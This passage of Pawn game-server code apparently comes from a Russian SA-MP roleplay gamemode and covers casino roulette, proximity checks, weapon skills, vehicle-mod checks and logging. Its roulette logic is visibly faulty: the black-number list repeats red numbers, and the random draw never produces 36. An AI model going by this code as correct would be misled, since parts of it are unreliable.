		GiveMoney(playerid,RouletteSumm[playerid]);
		RouletteSumm[playerid] = 0;
		RouletteStart[playerid] = false;
	}
	return true;
}
//==============================================================================
forward RuletCheck();
public RuletCheck() // Казино
{
	new WinNumber;
	new randnumber, timegametext;
	new Slotrulet1,string[8], strk2[64];
	if(RouletteRunned[0] == true)
	{
		foreach(new i:Player)
		{
			if(RouletteStart[i] == false) continue;
			if(UseRoulette[i] != 1) continue;
			if(!IsPlayerConnected(i)) continue;
			if(KrupieTime[0] <=50)
			{
				if(KrupieTime[0] < 40) randnumber = 1, timegametext = 100;
				else if(KrupieTime[0] < 45) randnumber = random(2), timegametext = 300;
				else randnumber = random(3), timegametext = 600;
				if(randnumber == 1)
				{
					WinNumber = 0 + random(36);
					KrupieTime[0]++;
					if(WinNumber == 0)
					{
						GameTextForPlayer(i, "~y~0", timegametext, 5);
					}
					else if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
					{
						format(string, 7, "~r~%d",WinNumber);
						GameTextForPlayer(i, string, timegametext, 5);
					}
					else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==11 || WinNumber ==13 || WinNumber ==15 || WinNumber ==17 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==29 || WinNumber ==31 || WinNumber ==33 || WinNumber ==35)
					{
						format(string, 7, "~w~%d",WinNumber);
						GameTextForPlayer(i, string, timegametext, 5);
					}
				}
			}
			else
			{
				WinNumber = 0 + random(36);
				RouletteRunned[0] = false;
				RouletteStart[i] =false;
				if (WinNumber == 0)
				{
					GameTextForPlayer(i, "0", 7000, 5);
				}
				else if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					format(string, 7, "~r~%d",WinNumber);
					GameTextForPlayer(i, string, 7000, 5);

				}
				else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					format(string, 7, "~w~%d",WinNumber);
					GameTextForPlayer(i, string, 7000, 5);
				}
				if (WinNumber ==1 || WinNumber ==3 || WinNumber ==5 || WinNumber ==7 || WinNumber ==9 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==19 || WinNumber ==21 || WinNumber ==23 || WinNumber ==25 || WinNumber ==27 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					Slotrulet1 = 1;
				}
				else if (WinNumber ==2 || WinNumber ==4 || WinNumber ==6 || WinNumber ==8 || WinNumber ==10 || WinNumber ==12 || WinNumber ==14 || WinNumber ==16 || WinNumber ==18 || WinNumber ==20 || WinNumber ==22 || WinNumber ==24 || WinNumber ==26 || WinNumber ==28 || WinNumber ==30 || WinNumber ==32 || WinNumber ==34 || WinNumber ==36)
				{
					Slotrulet1 = 2;
				}
				else
				{
					Slotrulet1 = 3;
				}
				RouletteRunned[0] = false;
				KrupieTime[0] = 0;
				RoulRunned[0] = true;
			}
		}
	}
	if(RoulRunned[0] == true)
	{
		for(new h=0;h<MAX_PLAYERS;h++)
		{
			if (UseRoulette[h] != 1) continue;
			if (RuletTip[h] <= 37 && RuletTip[h] >= 1)
			{
				RuletikProv[h] = RuletTip[h] - 1;
				if(RuletikProv[h] == WinNumber)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 20;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					format(strk2, 64, "Новости: id %d только что выиграл %d в казино!",h,RuletVidachaDen[h]);
					SendClientMessageToAll(COLOR_BLUE, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 38 || RuletTip[h] == 39)
			{
				if (Slotrulet1 == 1 && RuletTip[h]==38)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else if(Slotrulet1 == 2 && RuletTip[h]==39)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;

					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 40) // 1 proverka
			{
				if (WinNumber >=1 && WinNumber<=12)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 32, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 41) // 2 proverka
			{
				if (WinNumber >=13 && WinNumber<=24)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 42) // 3 proverka
			{
				if (WinNumber >=25 && WinNumber<=36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 3;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 43) // 4 proverka
			{
				if (WinNumber >=1 && WinNumber<=18)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 44) // 5 proverka
			{
				if (WinNumber >=19 && WinNumber<=36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] == 45) // 6 proverka
			{
				if (WinNumber == 2 || WinNumber == 4 || WinNumber == 6 || WinNumber == 8 || WinNumber == 10 || WinNumber == 12 || WinNumber == 14 || WinNumber == 16 || WinNumber == 18 || WinNumber == 20 || WinNumber == 22 || WinNumber == 24 || WinNumber == 26 || WinNumber == 28 || WinNumber == 30 || WinNumber == 32 || WinNumber == 34 || WinNumber == 36)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			else if (RuletTip[h] == 46) // 7 proverka
			{
				if (WinNumber == 1 || WinNumber == 3 || WinNumber == 5 || WinNumber == 7 || WinNumber == 9 || WinNumber == 11 || WinNumber == 13 || WinNumber == 15 || WinNumber == 17 || WinNumber == 19 || WinNumber == 21 || WinNumber == 23 || WinNumber == 25 || WinNumber == 27 || WinNumber == 29 || WinNumber == 31 || WinNumber == 33 || WinNumber == 35)
				{
					RuletVidachaDen[h] = RouletteSumm[h] * 2;
					GiveMoney(h,RuletVidachaDen[h]);
					format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
					SendClientMessage(h, COLOR_YELLOW, strk2);
				}
				else
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;

				}
			}
			else if (RuletTip[h] ==47)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 3,6,9,12,15,18,21,24,27,30,33,36:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit =true;
					}
				}
				if (resullit==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}

			}
			else if (RuletTip[h] ==48)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 2,5,8,11,14,17,20,23,26,29,32,35:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit =true;
					}
				}
				if (resullit ==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}

			}
			else if (RuletTip[h] ==49)
			{
				new bool:resullit;
				switch(WinNumber)
				{
				case 1,4,7,10,13,16,19,22,25,28,31,34:
					{
						RuletVidachaDen[h] = RouletteSumm[h] * 3;
						GiveMoney(h,RuletVidachaDen[h]);
						format(strk2, 64, "Выпало число %d. Вы выйграли %d вирт!",WinNumber,RuletVidachaDen[h]);
						SendClientMessage(h, COLOR_YELLOW, strk2);
						resullit=true;
					}
				}
				if (resullit ==false)
				{
					format(strk2, 64, "Выпало число %d. Вы проиграли!",WinNumber);
					SendClientMessage(h, COLOR_YELLOW, strk2);
					new CasinoWin = RouletteSumm[h]/100;
					FracBank[11] += CasinoWin;
				}
			}
			DestroyObject(Fishka[h]);
			PlayerPlaySound(h, 0, 0.0, 0.0, 0.0);
			Update3DTextLabelText(CasinoText[0], COLOR_ORANGE, "СТОЛ №1: {10d800}принимает ставки");
			Fishka[h] = CreateObject(1913,fishechkax[h],fishechkay[h],1006.0690,0.00,0.00,0.00);
			Upravakazino[h] = true;
			RuletTip[h] = 0;
			RouletteSumm[h] = 0;
			RouletteStart[h] = false;
		}
	}
	if (RoulRunned[0] == true)
	{
		RoulRunned[0] = false;
		format(strk2, 64, "* [1 СТОЛ] %s говорит: Выпало число: %d",PlayerInfo[CroupierN[1]][pSendername],WinNumber);
		ProxDetectorX(2230.9751,1619.4532,1007.1303,14.00,COLOR_PURPLE,strk2);
		WinNumber=0;
		KillTimer(RuletTimer);
		if(PlayerInfo[CroupierN[1]][pPayCheck] <= 9000)
		{
			PlayerInfo[CroupierN[1]][pPayCheck] += 276;
		}
	}
	return true;
}
//==============================================================================
forward ProxDetectorS(Float:radi, playerid, targetid);
public ProxDetectorS(Float:radi, playerid, targetid)
{
	if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return true;
		}
	}
	return false;
}
//==============================================================================
forward VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z);
public VehicleToPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z)
{
	if(vehicleid != INVALID_VEHICLE_ID)
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return true;
		}
	}
	return false;
}
//==============================================================================
forward GMX();
public GMX()
{

	foreach(new i:Player)
	{
		if(IsPlayerConnected(i))
		{
			StopAudioStreamForPlayer(i);
		}
	}
	GameModeLoaded = false;
	GameTextForAll("~r~SERVER RESTARTING", 5000, 5);
	GameModeExit();
	return true;
}
//==============================================================================
forward PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z);
public PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		tempposx = (oldposx -x);
		tempposy = (oldposy -y);
		tempposz = (oldposz -z);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return true;
		}
	}
	return false;
}
//==============================================================================
forward AnimUpdate(playerid);
public AnimUpdate(playerid)
{
	if(IsPlayerConnected(playerid) && Meshok[playerid])
	{
		ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
	}
	return false;
}
//==============================================================================
public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	acstruct[playerid][checkmaptp] = 1; acstruct[playerid][maptplastclick] = GetTickCount();
	acstruct[playerid][maptp][0] = fX; acstruct[playerid][maptp][1] = fY; acstruct[playerid][maptp][2] = fZ;
	return true;
}
//==============================================================================
forward CheckPlayer(playerid);
public CheckPlayer(playerid)
{
	if(IsPlayerInVehicle(playerid, GetPVarInt(playerid, "RemoveCar")))
	{
		KickEx(playerid,4211);
	}
}
//==============================================================================
forward UpdateGZ(playerid);
public UpdateGZ(playerid)
{
	for(new i =1;i<=TOTALGZ;i++)
	{
		new str4[64], str5[64], str6[64];
		format(str4, sizeof(str4), "%d", Napad);
		format(str5, sizeof(str5), "%d", Zac);
		format(str6, sizeof(str6), "Timer : %d", ZoneTimer[i]);
	}
	return false;
}
//==============================================================================
public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	SetPVarInt(playerid,"EngineStalled",GetPVarInt(playerid,"EngineStalled")+1);
	if(GetPVarInt(playerid,"EngineStalled") >= 3 && Engine[vehicleid] == true)
	{
		Engine[vehicleid] = false;
		Lights[vehicleid] = false;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,0,0,alarm,doors,bonnet,boot,objective);
		GameTextForPlayer(playerid, "STALLED", 1000, 6);
		DeletePVar(playerid,"EngineStalled");
	}
	return true;
}
//==============================================================================
stock strtok(const strin[], &index)
{
	new length = strlen(strin);
	while ((index < length) && (strin[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (strin[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = strin[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
//==============================================================================
stock IsInAllowedM(mnumbers)
{
	for(new i =0;i<sizeof(allowedmfactions);i++)
	{
		if(mnumbers == allowedmfactions[i]) return true;
	}
	return false;
}
//==============================================================================
stock SetPlayerSkills(playerid)
{
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, PlayerInfo[playerid][pGunSkill][0]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, PlayerInfo[playerid][pGunSkill][1]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, PlayerInfo[playerid][pGunSkill][2]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, PlayerInfo[playerid][pGunSkill][3]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, PlayerInfo[playerid][pGunSkill][4]*10);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, PlayerInfo[playerid][pGunSkill][5]*10);
	return true;
}
//==============================================================================
stock OnPlayerAmmoChange(playerid, newammo, oldammo)
{
	if(newammo < oldammo)
	{
		switch(GetPlayerWeapon(playerid))
		{
		case 24:
			{
				SetPVarInt(playerid, "SkillD",GetPVarInt(playerid,"SkillD") +1);
				if(GetPVarInt(playerid,"SkillD") >= Ammo_DEAGLE && PlayerInfo[playerid][pGunSkill][1] < 100)
				{
					PlayerInfo[playerid][pGunSkill][1]++;
					SetPVarInt(playerid, "SkillD",0);
				}
			}
		case 23:
			{
				SetPVarInt(playerid, "SkillSD",GetPVarInt(playerid,"SkillSD") +1);
				if(GetPVarInt(playerid,"SkillSD")>= Ammo_SDPISTOL && PlayerInfo[playerid][pGunSkill][0] < 100)
				{
					PlayerInfo[playerid][pGunSkill][0]++;
					SetPVarInt(playerid, "SkillSD",0);
				}
			}
		case 25:
			{
				SetPVarInt(playerid, "SkillShot",GetPVarInt(playerid,"SkillShot") +1);
				if(GetPVarInt(playerid,"SkillShot") >= Ammo_SHOTGUN && PlayerInfo[playerid][pGunSkill][2] < 100)
				{
					PlayerInfo[playerid][pGunSkill][2]++;
					SetPVarInt(playerid, "SkillShot",0);
				}
			}
		case 29:
			{
				SetPVarInt(playerid, "SkillMP5",GetPVarInt(playerid,"SkillMP5") +1);
				if(GetPVarInt(playerid,"SkillMP5") >= Ammo_MP5 && PlayerInfo[playerid][pGunSkill][3] < 100)
				{
					PlayerInfo[playerid][pGunSkill][3]++;
					SetPVarInt(playerid, "SkillMP5",0);
				}
			}
		case 30:
			{
				SetPVarInt(playerid, "SkillAk47",GetPVarInt(playerid,"SkillAk47") +1);
				if(GetPVarInt(playerid,"SkillAk47") >= Ammo_AK47 && PlayerInfo[playerid][pGunSkill][4] < 100)
				{
					PlayerInfo[playerid][pGunSkill][4]++;
					SetPVarInt(playerid, "SkillAk47",0);
				}
			}
		case 31:
			{
				SetPVarInt(playerid, "SkillM4",GetPVarInt(playerid,"SkillM4") +1);
				if(GetPVarInt(playerid,"SkillM4") >= Ammo_M4A1 && PlayerInfo[playerid][pGunSkill][5] < 100)
				{
					PlayerInfo[playerid][pGunSkill][5]++;
					SetPVarInt(playerid, "SkillM4",0);
				}
			}
		}
	}
	return true;
}
//==============================================================================
stock IsABike(vid)
{
	new modelid = GetVehicleModel(vid);
	if(modelid == 509||modelid ==510||modelid ==581||modelid ==522||modelid ==521||modelid ==523||modelid ==586||modelid ==481||modelid ==448||modelid ==461||modelid ==463||modelid ==468||modelid ==471) return true;
	else return false;
}
//==============================================================================
stock Log(namelog[],string[])
{
	new year,day, month;
	new text[256],log[50],lolka[3],File:LogFile,i;
	gettime(lolka[0], lolka[1], lolka[2]);
	getdate(year,month,day);
	format(text, sizeof(text), "[%02d:%02d:%02d|%02d:%02d:%02d]%s\r\n",year,month,day,lolka[0],lolka[1],lolka[2],string);
	getdate(lolka[0], lolka[1], lolka[2]);
	format(log,sizeof(log),"logs/%s.log",namelog);
	LogFile = fopen(log, io_append);
	while (text[i] != EOS)
	{
		fputchar(LogFile, text[i], false);
		i++;
	}
	fclose(LogFile);
}
//==============================================================================
stock RemoveFromVehicle(playerid)
{
	if(GetPlayerState(playerid) == 2)
	{
		SetVehicleVelocity(GetPlayerVehicleID(playerid), 0.0, 0.0, 0.0);
		SetPVarInt(playerid, "RemoveCar", GetPlayerVehicleID(playerid));
		RemovePlayerFromVehicle(playerid);
		SetTimerEx("CheckPlayer", 3200, false, "i", playerid); //
	}
	else SendMes(playerid,-1,"Error #21178");
	return true;
}
//==============================================================================
stock iswheelmodel(modelid) {

	new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};
	for(new i=0;i<17;i++){
		if (modelid == wheelmodels[i])
		return true;
	}
	return false;
}
//==============================================================================
stock IllegalCarNitroIde(carmodel) {

	new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };
	for(new i=0;i<29;i++) {
		if (carmodel == illegalvehs[i])
		return true;
	}
	return false;
}
//==============================================================================
stock illegal_nos_vehicle(PlayerID) {

	new carid = GetPlayerVehicleID(PlayerID);
	new playercarmodel = GetVehicleModel(carid);
	return IllegalCarNitroIde(playercarmodel);
}
//==============================================================================
stock islegalcarmod(vehicleide, componentid)
{
	new modok = false;
	if ((iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
		new nosblocker = IllegalCarNitroIde(vehicleide);
		if (!nosblocker) modok = true;
	}
	else for(new I=0;I<48;I++) if(legalmods[I][0] == vehicleide)
	for(new J = 1; J < 22; J++)
	if(legalmods[I][J] == componentid) modok = true;
	return modok;
}
//==============================================================================
stock GetPlayerID(playername[])
{
	for(new i = 0; i <= MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i)) continue;
		new playername2[MAX_PLAYER_NAME];
		GetPlayerName(i, playername2, sizeof(playername2));
		if(strcmp(playername2, playername, true, strlen(playername)) == 0) return i;
	}
	return INVALID_PLAYER_ID;
}
//==============================================================================
stock HospitalHealth(playerid)
{
	if(PlayerLogged[playerid] == 1)
	{
		if(PlayerInfo[playerid][pHospital] == 1)
		{
			if(PlayerInfo[playerid][pHeal] < 90.00)
			{
				if(PlayerToPoint(6.0,playerid,1183.5604,-1346.1671,1584.9778) || PlayerToPoint(6.0,playerid,1200.2266,-1346.2358,1584.9851) || PlayerToPoint(6.0,playerid,1183.7390,-1353.6138,1584.9778) || PlayerToPoint(6.0,playerid,1200.1163,-1353.6847,1584.9778))
				{
					GameTextForPlayer(playerid, "~g~+1 hp", 300, 6);
					SetHealth(playerid, PlayerInfo[playerid][pHeal]+1.0);
				}
			}
			else
			{
				PlayerInfo[playerid][pHospital] = 0;
			}
		}
	}
}
//==============================================================================
stock CaptureUpd(bandkiller)
{
	new SCORE1[128];
	new SCORE2[128];
	foreach(new i:Player)
	{
		if(PlayerLogged[i] == 0) continue;
		if(GangInfo[PlayerInfo[i][pMember]][capture] > 0)
		{
			if(GangInfo[bandkiller][gangnumber] == 1)
			{
				format(SCORE1, 64, "%d", GangInfo[bandkiller][score]);
				TextDrawSetString(ScoreCapt1a[i], SCORE1);
			}
			else
			{
				format(SCORE2, 64, "%d", GangInfo[bandkiller][score]);
				TextDrawSetString(ScoreCapt2a[i], SCORE2);
			}
		}
	}
}
//==============================================================================
stock CaptureStart(familyone, familytwo)
{
	new BANDAA[128],BANDAB[128];
	foreach(new i:Player)
	{
		if(PlayerLogged[i] == 0) continue;
		if(PlayerInfo[i][pMember] == familyone || PlayerInfo[i][pMember] == familytwo)
		{
			TextDrawShowForPlayer(i, BandaCapt1a[i]);
			TextDrawShowForPlayer(i, BandaCapt2a[i]);
			TextDrawShowForPlayer(i, ScoreCapt1a[i]);
			TextDrawShowForPlayer(i, ScoreCapt2a[i]);
			TextDrawShowForPlayer(i, ScoreCaptTire[i]);
			TextDrawShowForPlayer(i, CaptTime[i]);
			TextDrawShowForPlayer(i, ScoreCapt[i]);
			TextDrawShowForPlayer(i, Textdraw4[i]);
			format(BANDAA, 128, "%s", GetGangName(familyone));
			TextDrawSetString(BandaCapt1a[i], BANDAA);
			format(BANDAB, 128, "%s", GetGangName(familytwo));
			TextDrawSetString(BandaCapt2a[i], BANDAB);

			format(BANDAA, 64, "0");
			TextDrawSetString(ScoreCapt1a[i], BANDAA);

			format(BANDAB, 64, "0");
			TextDrawSetString(ScoreCapt2a[i], BANDAB);
		}
	}
}
//==============================================================================
stock CaptureEnd(familyone, familytwo)
{
	foreach(new i:Player)
	{
		if(PlayerInfo[i][pMember] == familyone || PlayerInfo[i][pMember] == familytwo)
		{
			TextDrawHideForPlayer(i, BandaCapt1a[i]);
			TextDrawHideForPlayer(i, BandaCapt2a[i]);
			TextDrawHideForPlayer(i, ScoreCapt1a[i]);
			TextDrawHideForPlayer(i, ScoreCapt2a[i]);
			TextDrawHideForPlayer(i, ScoreCaptTire[i]);
			TextDrawHideForPlayer(i, CaptTime[i]);
			TextDrawHideForPlayer(i, ScoreCapt[i]);
			TextDrawHideForPlayer(i, Textdraw4[i]);
		}
	}
}
//==============================================================================
stock GetJobName(playerid)
{
	new rangname[32];
	switch(PlayerInfo[playerid][pJob])
	{
	case J_BUS: rangname = "Водитель автобуса";
	case J_TAXI: rangname = "Водитель такси";
	case J_PRODUCT: rangname = "Развозчик продуктов";
	case J_FUEL: rangname = "Развозчик топлива";
	case J_MECHANIC: rangname = "Автомеханик";
	case J_TRUCKER: rangname = "Дальнобойщик";
	default: rangname = "Нет";
	}
	return rangname;
}
//==============================================================================
stock GetFracName(playerid)
{
	new rangname[32];
	if(PlayerInfo[playerid][pMember] > 0)
	{
		strmid(rangname,FracInfo[PlayerInfo[playerid][pMember]][fName],0,strlen(FracInfo[PlayerInfo[playerid][pMember]][fName]), 128);
	}
	else rangname = "Нет";
	return rangname;
}
//==============================================================================
stock GetRangName(playerid)
{
	new rangname[32];
	if(PlayerInfo[playerid][pRank] > 0)
	{
		strmid(rangname,FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],0,strlen(FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]]), 128);
	}
	else rangname = "Нет";
	return rangname;
}
stock IsAPlane(carid){switch(GetVehicleModel(carid)){case 592,577,511,512,593,520,553,476,519,460,513,548,417,487,488,497,563,447,469:return true;}return false;}
//==============================================================================
stock IsAMoped(carid)
{
	new carmodelid = GetVehicleModel(carid);
	if(carmodelid==462)
	{  return true; }
	return false;
}
//==============================================================================
stock IsABoat(carid){switch(GetVehicleModel(carid)){case 472,473,493,595,484,430,452..454,446:return true;}return false;}
//==============================================================================
stock VaildFishPlace(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 4,403.8266,-2088.7598,7.8359) || IsPlayerInRangeOfPoint(playerid, 4,398.7553,-2088.7490,7.8359)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 4,396.2197,-2088.6692,7.8359) || IsPlayerInRangeOfPoint(playerid, 4,391.1094,-2088.7976,7.8359)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 4,383.4157,-2088.7849,7.8359) || IsPlayerInRangeOfPoint(playerid, 4,374.9598,-2088.7979,7.8359)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 4,369.8107,-2088.7927,7.8359) || IsPlayerInRangeOfPoint(playerid, 4,367.3637,-2088.7925,7.8359)) return true;
